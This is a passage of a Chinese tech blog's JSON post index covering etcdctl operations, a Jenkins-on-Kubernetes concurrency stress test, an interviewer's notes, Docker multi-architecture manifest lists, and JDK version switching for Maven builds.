--cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/node-node1.pem --key=/etc/ssl/etcd/ssl/node-node1-key.pem endpoint health 或者\n1 2 3 4 5 ETCDCTL_API=3 etcdctl \\ --cacert=/etc/kubernetes/pki/etcd/ca.crt \\ --cert=/etc/kubernetes/pki/etcd/server.crt \\ --key=/etc/kubernetes/pki/etcd/server.key \\ endpoint health 这样就要求，每条 Ectdctl 命令都需要加上证书和版本相关参数。\n通过环境变量注入 1 2 3 4 export ETCDCTL_API=3 export ETCDCTL_CACERT=/etc/ssl/etcd/ssl/ca.pem export ETCDCTL_CERT=/etc/ssl/etcd/ssl/node-node1.pem export ETCDCTL_KEY=/etc/ssl/etcd/ssl/node-node1-key.pem 或者\n1 2 3 4 export ETCDCTL_API=3 export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/server.crt export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/server.key 可以将这些环境变量设置在 /etc/profile 中，然后 source /etc/profile ，就可以直接使用下面的命令进行操作。\n1 etcdctl endpoint health 5. Etcdctl 常见运维操作 获取 etcd 版本 1 etcdctl version 查看集群状态 1 etcdctl endpoint status --write-out=table 查看节点 1 etcdctl member list --write-out=table 碎片整理 1 etcdctl defrag 压缩 1 2 3 rev=$(etcdctl endpoint status --write-out=\u0026#34;json\u0026#34; | egrep -o \u0026#39;\u0026#34;revision\u0026#34;:[0-9]*\u0026#39; | egrep -o \u0026#39;[0-9].*\u0026#39;) # 压缩丢掉旧版本 etcdctl compact $rev 增删节点 增加节点\n1 etcdctl member add etcd-member-node http://192.168.11.102:2383 删除节点\n1 etcdctl member remove 9855cd41eff59e2b 备份和恢复 备份\n1 etcdctl snapshot save snapshot-xxx.db 恢复时，需要停止全部 apiserver、etcd 实例，删除当前的 etcd 数据，然后拷贝备份数据到每个 etcd 节点上，执行命令\n1 etcdctl snapshot restore snapshot-xxx.db 查看集群状态 1 etcdctl endpoint health 增删改查 具体某个 Key\n1 etcdctl get /registry/namespaces/default 根据前缀查询\n1 etcdctl get / --prefix --keys-only 增加/修改\n1 etcdctl put key newVaule 1 etcdctl del key 6. 安装 etcdhelper Etcdctl 不能直接查看数据内容，需要借助 Etcdhelper 工具。\n安装 1 2 3 4 5 git clone https://github.com/openshift/origin.git cd origin go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct go build tools/etcdhelper/etcdhelper.go mv etcdhelper /usr/local/bin/ 使用 1 etcdhelper -cacert /etc/kubernetes/pki/etcd/ca.crt -key /etc/kubernetes/pki/etcd/server.key -cert /etc/kubernetes/pki/etcd/server.crt get /registry/pods/xxx/xxx 得到 Etcd 中的 JSON 格式数据。\n7. 参考 https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/hardware.md ","description":"","id":290,"section":"post","tags":["博文","Etcd","Etcdctl","Kubernetes"],"title":"Etcd、Etcdctl 应用实践","uri":"https://www.chenshaowen.com/blog/the-use-of-etcd-and-etcdctl.html"},{"content":" 前面的文档中，我们利用 Kubernetes 提供的弹性，在 Kubernetes 上动态创建 Jenkins Slave 。本篇文档主要是对 Jenkins 进行大规模构建的压力测试。\n1. 集群配置 1.1 Kubernetes 版本 这里使用的是 v1.16.7\n1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;16\u0026#34;, GitVersion:\u0026#34;v1.16.7\u0026#34;, GitCommit:\u0026#34;be3d344ed06bff7a4fc60656200a93c74f31f9a4\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-02-11T19:34:02Z\u0026#34;, GoVersion:\u0026#34;go1.13.6\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;16\u0026#34;, GitVersion:\u0026#34;v1.16.7\u0026#34;, GitCommit:\u0026#34;be3d344ed06bff7a4fc60656200a93c74f31f9a4\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-02-11T19:24:46Z\u0026#34;, GoVersion:\u0026#34;go1.13.6\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 1.2 节点数量 集群节点总数， 16 个\n1 2 3 kubectl get node |grep \u0026#34;Ready\u0026#34; | wc -l 16 其中 master 节点 3 个，worker 节点 13 个。\n1 2 3 kubectl get node |grep \u0026#34;master\u0026#34; | wc -l 3 1 2 3 kubectl get node |grep \u0026#34;worker\u0026#34; | wc -l 13 1.3 CI 节点 选取其中的 10 个节点用于 CI 构建，5 个 8 核 32 G ，5 个 16 核 32 G 。给这些节点打上 Label node-role.kubernetes.io/worker=ci ，用于构建 Pod 选取 Node 使用，避免影响集群上的其他负载。\n1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl top node -l node-role.kubernetes.io/worker=ci NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% ci1 67m 0% 1268Mi 8% ci10 100m 1% 1273Mi 4% ci2 80m 1% 1258Mi 8% ci3 90m 1% 1274Mi 8% ci4 72m 0% 1286Mi 8% ci5 80m 1% 1276Mi 8% ci6 80m 1% 1268Mi 4% ci7 89m 1% 1293Mi 4% ci8 118m 1% 1285Mi 4% ci9 81m 1% 1268Mi 4% 1.4 CI 资源配置 Pod 数量限制，足够支持 1100 Pod 按照官网文档描述，Kubernetes 最大支持 5000 个节点，15 W 个 Pod。\n1 2 3 4 5 6 At v1.18, Kubernetes supports clusters with up to 5000 nodes. More specifically, we support configurations that meet all of the following criteria: No more than 5000 nodes No more than 150000 total pods No more than 300000 total containers No more than 100 pods per node 除了集群 Pod 总数有上限，这里有意义的是 kubelet 对 pod 最大数量的限制。\n1 2 3 4 cat /var/lib/kubelet/config.yaml|grep max maxOpenFiles: 1000000 maxPods: 110 10 个 CI 节点，总共能提供 1100 个 Pod，除去一些系统组件占用，已经足够。\nMemory 和 CPU，足够支持 400 条流水线并发 每个 Pod 大约占用 500 MB Memory，CPU 是构建时瞬时值会比较高，但是维持时间较短，这里不用太多考虑。5 个 8 核 32 G ，5 个 16 核 32 G，总共有 120 核 320 G 内存，足够支撑 400 ( \u0026gt; 320 * 0.8 / 0.5 = 512) 条流水线同时构建。另外，由于 Jenkins Agent Pod 配置的是软亲和，当 CI 节点资源不足时，也可以调度到其他节点。\n2. Jenkins 配置 2.1 Jenkins 即使流水线是在 Agent 上执行，但是大量的流水线同时运行，也会对 Jenkins 产生压力，这里给 Jenkins 的 limit 为 8 核 16 GB ，也就是最大允许消耗的资源量。\nJenkins 采用 Helm 部署，运行在 Kubernetes 上。下面是截取的部分 Deployment 信息:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 kind: Deployment apiVersion: apps/v1 metadata: name: ks-jenkins namespace: ks-jenkins labels: app.kubernetes.io/managed-by: Helm chart: jenkins-0.19.0 spec: replicas: 1 template: metadata: labels: chart: jenkins-0.19.0 spec: containers: - name: ks-jenkins image: \u0026#39;jenkins/jenkins:2.176.2\u0026#39; env: - name: JAVA_TOOL_OPTIONS value: \u0026gt;- -Xms3g -Xmx6g -XX:MaxRAM=16g -Dhudson.slaves.NodeProvisioner.initialDelay=20 -Dhudson.slaves.NodeProvisioner.MARGIN=50 -Dhudson.slaves.NodeProvisioner.MARGIN0=0.85 -Dhudson.model.LoadStatistics.clock=5000 -Dhudson.model.LoadStatistics.decay=0.2 -Dhudson.slaves.NodeProvisioner.recurrencePeriod=5000 -Dio.jenkins.plugins.casc.ConfigurationAsCode.initialDelay=10000 -verbose:gc -Xloggc:/var/jenkins_home/gc-%t.log -XX:NumberOfGCLogFiles=2 -XX:+UseGCLogFileRotation -XX:GCLogFileSize=100m -XX:+PrintGC -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintHeapAtGC -XX:+PrintGCCause -XX:+PrintTenuringDistribution -XX:+PrintReferenceGC -XX:+PrintAdaptiveSizePolicy -XX:+UseG1GC -XX:+UseStringDeduplication -XX:+ParallelRefProcEnabled -XX:+DisableExplicitGC -XX:+UnlockDiagnosticVMOptions -XX:+UnlockExperimentalVMOptions - name: kubernetes.connection.timeout value: \u0026#39;60000\u0026#39; - name: kubernetes.request.timeout value: \u0026#39;60000\u0026#39; schedulerName: default-scheduler ... 2.2 Jenkins Agent 使用 Kubernetes 提供的动态 Pod 作为 Jenkins Agent 用于构建流水线，具体配置可以参考顶部的文档链接。\nPod 中的 Maven 容器镜像 Dockerfile 主要内容如下：\nDockerfile\n1 2 3 4 5 6 centos:7 # java RUN yum install -y java-1.8.0-openjdk \\ java-1.8.0-openjdk-devel \\ java-1.8.0-openjdk-devel.i686 ... 为了减少对其他节点的影响，在 Jenkins 中配置了软亲和，将创建的动态 Pod 尽量调度到指定的 CI 节点。\n1 2 3 4 5 6 7 8 9 10 11 spec: affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: node-role.kubernetes.io/worker operator: In values: - ci 2.4 Jenkins 中 Kubernetes 插件配置 将容器数量和等待时间设置为一个较大值。\n2.5 测试用的 Pipeline Demo Demo 采用的是一个 Java 项目，克隆代码、执行单元测试、镜像构建。由于镜像内容都一样，这里就没有推送镜像，同时也减少了外部依赖。gitee.com 对拉取频率也有限制，建议使用自己搭建的代码仓库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 pipeline { agent { node { label \u0026#39;maven\u0026#39; } } environment { REGISTRY = \u0026#39;docker.io\u0026#39; DOCKERHUB_NAMESPACE = \u0026#39;shaowenchen\u0026#39; APP_NAME = \u0026#39;devops-java-sample\u0026#39; TAG_NAME = \u0026#34;SNAPSHOT-$BRANCH_NAME-$BUILD_NUMBER\u0026#34; } stages { stage(\u0026#39;checkout\u0026#39;) { steps { container(\u0026#39;maven\u0026#39;) { git branch: \u0026#39;master\u0026#39;, url: \u0026#39;https://gitee.com/shaowenchen/devops-java-sample.git\u0026#39; } } } stage(\u0026#39;unit test\u0026#39;) { steps { container(\u0026#39;maven\u0026#39;) { sh \u0026#39;mvn clean -o -gs `pwd`/configuration/settings.xml test\u0026#39; } } } stage(\u0026#39;build\u0026#39;) { steps { container(\u0026#39;maven\u0026#39;) { sh \u0026#39;mvn -o -Dmaven.test.skip=true -gs `pwd`/configuration/settings.xml clean package\u0026#39; sh \u0026#39;docker build -f Dockerfile-online -t $REGISTRY/$DOCKERHUB_NAMESPACE/$APP_NAME:SNAPSHOT-$BRANCH_NAME-$BUILD_NUMBER .\u0026#39; } } } stage(\u0026#39;sleep 0.5h\u0026#39;) { steps { sh \u0026#39;sleep 1800\u0026#39; } } } } 2.6 远程触发流水线脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 # -*- coding: utf-8 -*- # import time import requests jenkins_job_name = \u0026#34;new\u0026#34; Jenkins_url = \u0026#34;http://jenkins.chenshaowen.com:8080\u0026#34; jenkins_user = \u0026#34;admin\u0026#34; jenkins_pwd = \u0026#34;password\u0026#34; # buildWithParameters = True # if there are parameters buildWithParameters = False jenkins_params = {\u0026#39;token\u0026#39;: \u0026#39;mytoken\u0026#39;, \u0026#39;param1\u0026#39;: \u0026#39;valu1\u0026#39;} def trigger(): try: auth = (jenkins_user, jenkins_pwd) crumb_data = requests.get( \u0026#34;{0}/crumbIssuer/api/json\u0026#34;.format(Jenkins_url), auth=auth, headers={ \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;}) if str(crumb_data.status_code) == \u0026#34;200\u0026#34;: if buildWithParameters: data = requests.get( \u0026#34;{0}/job/{1}/buildWithParameters\u0026#34;.format( Jenkins_url, jenkins_job_name), auth=auth, params=jenkins_params, headers={ \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Jenkins-Crumb\u0026#39;: crumb_data.json()[\u0026#39;crumb\u0026#39;]}) else: data = requests.get( \u0026#34;{0}/job/{1}/build\u0026#34;.format( Jenkins_url, jenkins_job_name), auth=auth, params=jenkins_params, headers={ \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Jenkins-Crumb\u0026#39;: crumb_data.json()[\u0026#39;crumb\u0026#39;]}) print(data.status_code) if str(data.status_code) == \u0026#34;201\u0026#34;: print(\u0026#34;Jenkins job is triggered\u0026#34;) else: print(\u0026#34;Failed to trigger the Jenkins job\u0026#34;) else: print(\u0026#34;Couldn\u0026#39;t fetch Jenkins-Crumb\u0026#34;) raise except Exception as e: print(\u0026#34;Failed triggering the Jenkins job\u0026#34;) print(\u0026#34;Error: \u0026#34; + str(e)) if __name__ == \u0026#34;__main__\u0026#34;: for i in range(400): # time.sleep(1) print(\u0026#34;Trigger-\u0026#34; + str(i)) trigger() 3. 测试策略 为了更好的测试 Jenkins 在 Kubernetes 上执行流水线的性能，在上面的配置中，我提供了足够 400 条流水线并发执行的资源。\n由于首次运行流水线时，需要拉取镜像、对依赖包进行缓存。在执行测试之前，执行 20 次流水线对节点进行预热。\n主要进行五组测试，分别为 50、100、200、400、800 条流水线并发。\n观察的指标\n触发流水线成功率 Jenkins UI 能否正常打开 Jenkins 创建 Pod 的速度 流水线执行成功率 失败的原因 4. 测试结果 流水线并发数量 触发成功率 UI 能否正常打开 全部 Pod 创建成功耗时 流水线执行成功率 失败的原因 50 50/50 可以 12分钟 50/50 - 100 100/100 可以 7分钟 100/100 - 200 200/200 4 秒加载 7分钟 178/200 Gitee 限制了拉取频率 400 400/400 11 秒加载 21分钟 348/400 Gitee 限制了拉取频率 800 778/800 17 秒加载 18分钟 446/800 触发失败、流水线堆积无法调度 下面是具体的监控数据和分析\n50 并发 正常执行，应该是预热不够充分，后半段速度变慢，创建时间较长。\n100 并发 正常执行，创建 Pod 速度很快，3~4 秒一个\n200 并发 触发正常，执行时部分流水线报错。这里的错误，主要是拉取 git 服务器代码受到了限制。错误提示如下：\n400 并发 有极少量调度到非 CI 节点，同样有大量拉取 git 服务器代码提示错误。\n800 并发 460、461、551、552、759-776 触发失败。有少量调度到非 CI 节点，大量流水线堆积在 Build Queue ，这些流水线长时间不被调度，尝试重启 Jenkins 依然无法执行。\n800 条流水线并发，超过了集群的负载极限。Jenkins 使用的内存达到了极限，能连接管理的 jnlp 数量也达到了极限。下面是相关的提示报错：\n1 2 3 4 5 6 7 INFO: Server reports protocol JNLP-connect not supported, skipping Aug 02, 2020 7:20:33 AM hudson.remoting.jnlp.Main$CuiListener error SEVERE: The server rejected the connection: None of the protocols were accepted java.lang.Exception: The server rejected the connection: None of the protocols were accepted at hudson.remoting.Engine.onConnectionRejected(Engine.java:675) at hudson.remoting.Engine.innerRun(Engine.java:639) at hudson.remoting.Engine.run(Engine.java:474) -XX:MaxRAM=16g 的配置在 400 并发时，明显吃力，到了 800 并发时，已经不够。之后，我又将最大内存使用设置为 32 g 进行测试，触发成功率有所改善，依然达不到 100% ； Pod 创建速度变快，集群资源充足的情况下，依然有部分堵在 Build Queue 中无法调度。\n后来，我找了一个 202 个节点的集群进行测试，Jenkins 内存限制设置很大。通过接口不停地发送触发请求，Pod 数量最高峰在 517（=520-3），Pod 中的 jnlp 与 Jenkins 连接出现问题。同时，也伴随着大量触发和构建错误。下图是，关于 Pod 数量监控:\n5. 测试总结和建议 从原理上讲 Jenkins 的 Kubernetes 插件实现的功能是调用 Kubernetes 的接口，创建 Pod 用于构建。创建的 Pod 中包含 jnlp 和真正构建环境的容器。\n在高并发、高负载的场景下，瓶颈会出现在如下方面：\nJenkins 提供的 API Jenkins 的调度算法 Jenkins 调用的 Kubernetes API Kubernetes 调度创建 Pod 的速度 Pod 运行时的资源消耗，CPU、Mem、IO 等 Jenkins 的 Mem 和 CPU 限制 这次测试不算特别完善，有如下问题：\n预热不够充分。测试 50 并发的数据有明显问题，创建速度比 100 并发还慢，说明有些节点没有相关的镜像或缓存。 Jenkins 内存不够充足。在 400 并发时，Jenkins 的内存使用已经接近 limit 限制，页面打开缓慢。 配置建议：\n限制 Jenkins 同时连接 Pod 的数量，配置足够的情况下，200 并发是没有问题的，400 并发是可以争取的。Jenkins 需要与每一个 Pod 中的 jnlp 通信，控制并发数量能有效减轻 Jenkins 的负担，避免触发失败的发生。 使用专用的 CI 节点。让流水线的 Pod 在节点之间随意漂移，充分享受 Kubernetes 提供的弹性固然很好，但是大量并发的流水线会挤走节点上的负载，导致其他应用不稳定。 构建的 Pod 需要设置合适的 request 。与创建应用负载类似，过小的 request 会导致调度成功，但是 Pod 起不来的问题。大量流水线并发时，过小的 request 可能会直接压垮节点。 充足的 Jenkins 内存，16 G 基本能保证系统稳定，CPU 4C 及以上即可。Java 应用占用内存比较多。分配充足的内存给 Jenkins，可以提高触发成功率，提高 Pod 的创建效率，同时 Jenkins 也更稳定，不容易出现 Jenkins 页面打不开的情况。 绑定一个专门的节点用来运行 Jenkins。当给 Jenkins 设置了较大的内存限制时，随着并发数量上升，内存使用逐渐增加，虽然 limit 很大，但是节点内存可能不够，这样可能会导致 Jenkins 被调度到其他节点。 使用单实例 Jenkins 。Jenkins 使用磁盘文件存储数据，多实例会让 Jenkins 紊乱。提示错误如下: 1 2 3 4 5 Error Jenkins detected that you appear to be running more than one instance of Jenkins that share the same home directory \u0026#39;/var/jenkins_home\u0026#39;. This greatly confuses Jenkins and you will likely experience strange behaviors, so please correct the situation. This Jenkins:\t449134911 contextPath=\u0026#34;\u0026#34; at 6@ks-jenkins-68b8949bb-mgmjc Other Jenkins:\t1869668338 contextPath=\u0026#34;\u0026#34; at 6@ks-jenkins-68b8949bb-kg49k 6. 参考 https://kubernetes.io/docs/setup/best-practices/cluster-large/ ","description":"","id":291,"section":"post","tags":["博文","Jenkins","Kubernetes","DevOps","测试"],"title":"Kubernetes 动态创建 Jenkins Agent 压力测试","uri":"https://www.chenshaowen.com/blog/the-stress-test-about-kubernetes-dynamically-creates-jenkins-agent.html"},{"content":" 最近离职的小伙伴有点多，比较缺人。陆陆续续面试了近十位候选人，一面通过率大约 50 % ，还没有确定的 HC 。\n1. 准备工作 搜集简历。发帖、邮件公告、朋友圈、招聘网站，都是简历来源。离开的人有各种各样的理由，待遇差、不喜欢的工作方式、不开心、不受重视，当然也有各种各样的人想要进来。这就像围城，城里的人觉得外面好，想出去；城外的人觉得城里好，想进来。我认为互联网团队保持长期活跃的招聘渠道是必要的。一方面招聘人需要较长周期，另一方面也是警示，避免人员离职导致项目风险，还能与外界随时保持沟通。\n这次简历主要由 HR 提供。HR 会和候选者沟通，确认基本情况，与我预约面试时间，然后发送一封正式的面试邀请邮件和简历给我。\n通常，面试会在隔一天的非工作时间段进行。这样是为了避免时间冲突，并准备面试。\n准备面试主要是，打印简历，挑出简历中的一些关键信息。这些关键信息包括，与职位相关的技能、项目。有些候选者，可能会在简历中使用特殊字体凸显某些关键字，引导面试官。这样也非常不错，前提是确实很熟悉，否则可能适得其反。\n2. 面试过程 面试分为如下过程：\n自我介绍 如果候选者准备了不一样的自我介绍，我会给他表现的机会。如果只是简历内容，我会让他跳过。\n算法 Leetcode 上面一道中等的算法题。算法题没有强制要求白纸写代码，能给出正确的数据结构、思路、边界就行。主动与面试官沟通，表述思考过程，都是加分项。\n基本技能 考察工具使用、组件使用、编程语言等。比如 Git 的基本命令、Golang 的一些特性、Docker 原理等。\n项目 主要关注与职位相关的项目，也考察表达、沟通能力。我会根据表述，提出一些挑战，问一些底层的实现细节。比如，为什么不用 A，而用 B，它们有什么区别; 多进程与多线程的区别；宕机了，怎么办; 有没有关注业内的同类明星项目等。\n团队介绍 我会简单介绍一下团队的情况，主要负责什么项目，引起候选者的兴趣。如果我认为候选者面试还不错，可能会多说点。\n候选者提问 最后将主动权交给候选者，解答候选者的疑问。\n3. 面试反馈 面试大概有 8 个问题左右，持续 30 分钟到 40 分钟。面试完成后，需要给 HR 反馈面试情况。下面是我的反馈格式：\n1 2 3 4 5 6 7 面试内容： - xxx - xxx - xxx 总结，面试通过。xxx 如果候选者回答问题没有明显缺陷，并有一两个亮点，相处没有不适感，我就会让候选者通过面试。\n","description":"","id":292,"section":"post","tags":["博文","研发","面试"],"title":"一面面试官总结","uri":"https://www.chenshaowen.com/blog/some-summaries-of-the-interviewer.html"},{"content":"1. 开启 Docker 的 experimental 特性 这里先开启 Docker 的 experimental 特性，方便下文使用相关命令。\n编辑文件 vim ~/.docker/config.json ，增加如下内容：\n1 2 3 4 { \u0026#34;experimental\u0026#34;: \u0026#34;enabled\u0026#34;, \u0026#34;debug\u0026#34;: true } 注意，这里不是 /etc/docker/daemon.json 文件，也不需要重启 Docker 。\n2. Docker 镜像 从 Docker 1.10 、 Registry 2.3 开始，Docker 引入了 manifest 用于描述镜像的元数据。\n2.1 Dockerfile 如何转换成镜像 如上图，Dockerfile 中的每行命令，在构建镜像时都会关联一个 layer 。layer 是对镜像层的简单包装。这些镜像层在存储时，会得到复用，也就是说多个镜像使用到一个镜像层时，仅存储一份。这里面还有一些概念上的细节，可以暂时忽略。\n2.2 Docker 与 Registry 如何传输镜像 镜像的元数据信息包括 size 、digest、layers 等信息。\nDocker 与 Registry 推拉镜像时，首先会传输 manifest 信息，仅当镜像层在当前环境中不存在时，才会进行网络传输，否则直接复用本地镜像层。\n2.3 manifest 的文件结构 直接查看镜像的 manifest\n查看 manifest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 docker manifest inspect jenkins/jnlp-slave { \u0026#34;schemaVersion\u0026#34;: 2, \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;config\u0026#34;: { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.container.image.v1+json\u0026#34;, \u0026#34;size\u0026#34;: 12327, \u0026#34;digest\u0026#34;: \u0026#34;sha256:9b5976169d3504ea796a4af75f8648db9a500e8b9351ee19276031108c59f429\u0026#34; }, \u0026#34;layers\u0026#34;: [ { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.image.rootfs.diff.tar.gzip\u0026#34;, \u0026#34;size\u0026#34;: 50382041, \u0026#34;digest\u0026#34;: \u0026#34;sha256:f15005b0235fa8bd31cc6988c4f2758016fe412d696e81aecf73e52be079f19e\u0026#34; }, { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.image.rootfs.diff.tar.gzip\u0026#34;, \u0026#34;size\u0026#34;: 7812166, \u0026#34;digest\u0026#34;: \u0026#34;sha256:41ebfd3d2fd0de99b1c63aa36a507bf5555481d06e571d84ed84440d30671494\u0026#34; }, ... ] } 查看多架构 manifest 通过 manifest.list 这个 mediaType ，可以将多个镜像整合为一个。在不同的 architecture 和 os 条件下，Docker 会自动拉取适配当前环境的镜像。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 docker manifest inspect maven { \u0026#34;schemaVersion\u0026#34;: 2, \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.list.v2+json\u0026#34;, \u0026#34;manifests\u0026#34;: [ { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;size\u0026#34;: 1579, \u0026#34;digest\u0026#34;: \u0026#34;sha256:3c5d1c8795c96b775723cf912b297850feb1fc8f4b98ec2eda4303f3a6277310\u0026#34;, \u0026#34;platform\u0026#34;: { \u0026#34;architecture\u0026#34;: \u0026#34;amd64\u0026#34;, \u0026#34;os\u0026#34;: \u0026#34;linux\u0026#34; } } ] } 3. 常见的几种多架构镜像的组织方式 不同的 OS 和 CPU 能运行的镜像会有差别。OS 层面，主要可以分为 Windows 和 类 Linux 的镜像。CPU 层面，主要有 amd64 、 arm 、ppc64le 、 s390x 等架构的镜像。amd64 也就是 x86-64 ，通常作为默认的架构，不用特意指明 amd64 和 linux 。\n3.1 通过 namespace 区分不同架构 格式 namespaces-{ARCH}-{OS}/image:tag\namd64 1 shaowenchen-amd64/coredns:latest 1 shaowenchen-arm/coredns:latest 3.2 通过 image name 区分不同架构 格式 namespaces/image-{ARCH}-{OS}:tag\namd64 1 shaowenchen/coredns-amd64:latest arm 1 shaowenchen/coredns-arm:latest 3.3 通过 tag name 区分不同架构 格式 namespaces/image:tag-{ARCH}-{OS}\namd64 1 shaowenchen/coredns:latest-amd64 arm 1 shaowenchen/coredns:latest-arm 4. manifest list 管理多架构镜像 manifest list 是一个镜像清单列表，用来存放不同架构的镜像信息。简单点说，就是新建了一个拉取镜像的入口，关联了不同架构的镜像，没有任何新的镜像层生成。\n首先推送镜像 1 2 3 docker push shaowenchen/coredns:coredns-amd64 docker push shaowenchen/coredns:coredns-arm docker push shaowenchen/coredns:coredns-arm64 否则，下面的步骤会报错 no such manifest: docker.io/shaowenchen/coredns:coredns-amd64\n创建多架构的 manifest list 1 2 3 4 5 6 docker manifest create shaowenchen/coredns:latest \\ shaowenchen/coredns:coredns-amd64 \\ shaowenchen/coredns:coredns-arm \\ shaowenchen/coredns:coredns-arm64 --amend Created manifest list docker.io/shaowenchen/coredns:latest [可选]更新相关架构的信息 1 docker manifest annotate shaowenchen/coredns:latest shaowenchen/coredns:coredns-arm --arch arm 查看 manifest list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 docker manifest inspect shaowenchen/coredns:latest { \u0026#34;schemaVersion\u0026#34;: 2, \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.list.v2+json\u0026#34;, \u0026#34;manifests\u0026#34;: [ { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;size\u0026#34;: 739, \u0026#34;digest\u0026#34;: \u0026#34;sha256:242d440e3192ffbcecd40e9536891f4d9be46a650363f3a004497c2070f96f5a\u0026#34;, \u0026#34;platform\u0026#34;: { \u0026#34;architecture\u0026#34;: \u0026#34;amd64\u0026#34;, \u0026#34;os\u0026#34;: \u0026#34;linux\u0026#34; } }, { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;size\u0026#34;: 739, \u0026#34;digest\u0026#34;: \u0026#34;sha256:e9e08bce9d74a48723518a476f67ada25d00ed69dd3719c3fde41b10d390b0d0\u0026#34;, \u0026#34;platform\u0026#34;: { \u0026#34;architecture\u0026#34;: \u0026#34;arm\u0026#34;, \u0026#34;os\u0026#34;: \u0026#34;linux\u0026#34; } }, { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;size\u0026#34;: 739, \u0026#34;digest\u0026#34;: \u0026#34;sha256:969a21696cff473cb4d36854b15118885fd414394d09444cfd111213fabcd982\u0026#34;, \u0026#34;platform\u0026#34;: { \u0026#34;architecture\u0026#34;: \u0026#34;amd64\u0026#34;, \u0026#34;os\u0026#34;: \u0026#34;linux\u0026#34; } } ] } 推送到 DockerHub 1 2 3 docker manifest push shaowenchen/coredns:latest sha256:bcdaff4935b922edd8f415323e04d3a77374f5ddabe0a59d649fd0b6be4ad5ef 在 DockerHub 页面查看推送的镜像 在各种架构下，都可以使用同一条命令，拉取镜像：\n1 docker pull shaowenchen/coredns:latest 这给部署带来了极大的便利，不需要给镜像拼接 architecture 和 os 信息。不同架构下，可以使用同一套部署程序。\n5. 参考 https://docs.docker.com/engine/reference/commandline/manifest/ ","description":"","id":293,"section":"post","tags":["博文","Docker","镜像"],"title":"多架构下的 Docker 镜像","uri":"https://www.chenshaowen.com/blog/docker-image-under-multi-arch.html"},{"content":"1. 编译报错：java.nio.file.NoSuchFileException 在编译 Jenkins 插件时，提示错误信息如下：\n1 2 3 4 mvn package Compilation failure [ERROR] java.nio.file.NoSuchFileException: /root/java/target/classes/META-INF/annotations/hudson.Extension 原来 Maven 使用的是 JAVA_HOME 而不是 PATH，找不到 Java 运行环境导致，而且 Java 11 不行，Java 1.8 才能正常编译。\n2. 安装 JDK 安装 Java 11 1 yum install -y java-11-openjdk-devel 安装 Java 1.8 1 yum install -y java-1.8.0-openjdk-devel 3. 选择 JDK 版本 选择当前 JDK 版本：\n1 2 3 4 5 6 7 8 alternatives --config java There are 2 programs which provide \u0026#39;java\u0026#39;. Selection Command ----------------------------------------------- 1 java-11-openjdk.x86_64 (/usr/lib/jvm/java-11-openjdk-11.0.7.10-4.el7_8.x86_64/bin/java) *+ 2 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.252.b09-2.el7_8.x86_64/jre/bin/java) 选择 2 之后， /usr/lib/jvm/java-openjdk 即为当前选择的版本。\n1 2 3 4 5 6 7 8 9 10 11 12 ls -l /usr/lib/jvm lrwxrwxrwx 1 root root 26 Jul 1 15:42 java -\u0026gt; /etc/alternatives/java_sdk lrwxrwxrwx 1 root root 29 Jul 1 15:42 java-11 -\u0026gt; /etc/alternatives/java_sdk_11 lrwxrwxrwx 1 root root 37 Jul 1 15:42 java-11-openjdk -\u0026gt; /etc/alternatives/java_sdk_11_openjdk drwxr-xr-x 8 root root 4096 Jul 1 15:42 java-11-openjdk-11.0.7.10-4.el7_8.x86_64 